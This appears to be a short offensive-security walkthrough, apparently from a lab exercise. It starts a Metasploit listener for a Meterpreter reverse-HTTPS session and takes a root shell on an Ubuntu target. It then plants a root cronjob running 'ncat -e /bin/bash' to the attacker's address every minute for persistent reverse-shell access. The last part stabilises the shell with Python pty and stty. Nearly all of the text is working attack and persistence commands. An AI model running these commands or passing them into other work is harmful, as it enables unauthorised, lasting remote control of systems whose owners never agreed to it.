Open up a terminal window and start the listener in order to see the current active sessions.

`msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_https; set LHOST 192.168.100.100; set LPORT 4443;set ExitOnSession false;exploit -j -z;"`

You can check "sessions" in msfconole using `sessions`
Let's start with the Ubuntu machine.
`sessions 1`

Using `shell` we can interact with the machine as _"Root"_

Knowing that, use `echo "* * * * * ncat -e /bin/bash 192.168.100.100 4444" >> /var/spool/cron/crontabs/root` in order to create a new cronjob on the Root account that will allow you to get a reverse shell at any given time.
#### Stabilizing the Shell

After successfully gaining the reverse shell, it's usually missing autocompletion and symbol deletion options, among other features.
In order to have a fully interactive shell, you must stabilize it.

Using the following steps, continue to stablize the shell using Python.

_Import pty module and spawn bash shell:_ 
`python3 -c 'import pty;pty.spawn("/bin/bash")'`

Press _(CTRL + Z )_ to background process and get back to your host machine.

Use _stty_ command to set terminal line settings and foreground back the target terminal:
`stty raw -echo; fg`

Set the terminal emulator to xterm: `export TERM=xterm`

Now that the shell is fully interactive and stabilized, use `whoami` to double-check the current user privileges and ensure you have the expected level of access on the target system.